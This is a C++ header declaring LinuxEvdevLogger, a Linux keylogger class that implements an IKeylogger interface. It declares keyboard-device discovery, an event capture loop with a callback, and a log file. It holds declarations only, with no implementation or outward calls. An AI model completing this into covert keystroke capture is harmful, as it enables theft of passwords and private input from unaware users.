#pragma once
#include "interfaces/IKeylogger.hpp"
#include <atomic>
#include <fstream>
#include <functional>
#include <string>
#include <thread>

namespace platform {
namespace linux_os {

    class LinuxEvdevLogger : public interfaces::IKeylogger {
    public:
        LinuxEvdevLogger();
        ~LinuxEvdevLogger() override;

        common::EmptyResult start(std::function<void(const interfaces::KeyEvent&)> on_event) override;
        void stop() override;
        bool is_active() const override { return running_.load(); }

    private:
        bool find_keyboard();
        bool open_device();
        void run_loop(std::function<void(const interfaces::KeyEvent&)> callback);

    private:
        std::string device_path_;
        int fd_ = -1;
        std::atomic<bool> running_{false};
        std::thread thread_;
        std::ofstream log_file_;
    };

} // namespace linux_os
} // namespace platform
